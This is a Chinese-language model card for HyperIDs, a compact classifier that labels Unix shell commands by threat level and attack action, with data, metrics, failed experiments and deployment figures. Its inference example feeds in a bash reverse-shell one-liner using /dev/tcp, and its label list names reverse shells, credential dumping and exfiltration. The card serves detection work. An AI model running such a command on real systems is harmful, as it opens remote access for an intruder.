# HyperIDs 模型卡（最新 / v2）

## 概览

- **项目/模型名**：HyperIDs
- **任务**：Unix shell 命令/脚本的威胁分类
- **框架**：GLiClass（第三方多标签分类框架）
- **骨干编码器**：`prajjwal1/bert-small`（4 层 / 512 维 / 8 头，WordPiece）
- **参数量**：29.8M（≤30M）
- **训练**：Lightning L4 GPU，4 epochs，batch 32，lr 5e-5

## 标签体系（v2 schema）

- **verdict（互斥 3）**：`benign` / `suspicious` / `malicious`
- **action（多标签 28）**：
  `download`, `execute_local`, `download_execute`, `command_and_control`,
  `obfuscate`, `file_operation`, `process_inject`, `network_scan`, `brute_force`,
  `reverse_shell`, `bind_shell`, `web_shell`, `backdoor`, `keylog`, `credential_dump`,
  `ransomware`, `cryptomining`, `exfiltrate`, `disable_security`, `clear_logs`,
  `timestomp`, `account_add`, `registry_persist`, `service_persist`, `schedule_persist`,
  `self_propagate`, `system_probe`, `environment_setup`
- **MITRE tactic/technique**：不预测，由 `schema.derive_attck(actions)` 规则表确定性推导。

## 数据

| split | 样本数 |
|---|---|
| train | 65,480 |
| val | 5,978 |
| test | 5,978 |

- 来源：QuasarNix（恶意）+ NL2Bash（良性）+ LLM 合成 + 红队变体。
- 教师：Jev（`jev-1.13.0`）——唯一标签来源，31 维软标签（verdict 3 + action 28）。
- verdict 分布（全量）：benign 28,688 / malicious 27,818 / suspicious 20,930。
- action 覆盖：28/28 全部有正样本；support 范围 28（最小）~ 35,539（最大，command_and_control）。

## 指标（test 5,978）

| 指标 | fp32 | INT8（部署） |
|---|---|---|
| **verdict_acc** | 0.9167 | **0.9187** |
| **action micro-F1** | 0.9090 | **0.9099** |
| action precision | 0.9351 | 0.9338 |
| action recall | 0.8843 | 0.8871 |

## 优化实验（全部已否决）

在 v2 基线上尝试了三条优化路线，**均未超过基线**，结论如下（test 5,978，同口径）：

| 方案 | verdict_acc | action micro-F1 | 结论 |
|---|---|---|---|
| **硬标签基线（最终）** | **0.917** | **0.909** | ✅ 保留 |
| + 软标签 KD（纯 soft 目标） | 0.861 | 0.745 | ❌ 否 |
| + KD + focal(γ=2, α=0.25) | 0.895 | 0.787 | ❌ 否 |
| + 长尾数据增强（硬标签） | 0.917 | 0.853 | ❌ 否（recall 被硬负样本压低，且冻结 test 无法验证稀有 action） |

- **KD 无效原因**：软目标让模型「拟合概率」而非「学决策」，logit 被压在 0.5 附近 → recall 崩、verdict argmax 变差；且合并 action 的软概率是「求和拼装」带噪声。
- **focal 无效原因**：`alpha=0.25` 方向反了——多标签正样本本就稀疏（平均 2.1/31），再压低正样本权重使 recall 崩。
- **增强数据无效原因**：硬负样本让模型整体变保守；冻结 test 集几乎没有稀有 action 正样本（cryptomining 0 / brute_force 2 / ransomware 7），无法验证收益。

**天花板**：Jev 软标签自身 38% action 正标签 / 24% verdict 正标签落在 0.5–0.7 模糊带，模型侧天花板约 **0.92–0.93**。要继续提升需换教师/重打标签，或补一个覆盖稀有 action 的评测集。

## 部署

| 项 | 值 |
|---|---|
| INT8 ONNX 体积 | **30.2MB** |
| fp32 ONNX | 118MB（external data） |
| C 运行时峰值 RSS | fp32 114.7MB / **INT8 96.2MB（<100MB ✅）** |
| INT8 vs fp32 | 基本无损（见上表） |

## 产物位置

- checkpoint / ONNX：`model/checkpoints_gpu/final_model_v2/`
  - `model.safetensors`（119MB）
  - `model.onnx` + `model.onnx.data`（fp32）
  - `model_int8.onnx`（30.2MB）
- schema：`label_schema.yaml` + `schema.py`（当前 31 标签）
- 训练/评估/推理：`model/train.py` / `model/eval.py` / `model/predict.py`


## 推理示例

```bash
python -m model.predict "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
# verdict   : verdict.malicious
# actions   : command_and_control, reverse_shell
# tactics   : command_and_control, initial_access
# techniques: T1059, T1071
```
